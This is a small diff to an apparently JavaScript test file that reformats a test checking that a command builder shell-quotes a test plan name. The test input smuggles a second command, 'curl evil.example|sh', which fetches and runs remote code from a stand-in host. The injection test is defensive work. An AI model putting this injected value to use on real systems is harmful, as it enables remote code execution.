@@ -154,7 +154,11 @@ describe('serialize/parse round-trip', () => {
 
   it('escapes a test plan containing shell syntax', () => {
     expect(
-      buildRunCommand({ ...base, testPlan: 'test.jmx;curl evil.example|sh', generateReport: false }),
+      buildRunCommand({
+        ...base,
+        testPlan: 'test.jmx;curl evil.example|sh',
+        generateReport: false,
+      }),
     ).toContain("-t 'test.jmx;curl evil.example|sh'");
   });
 
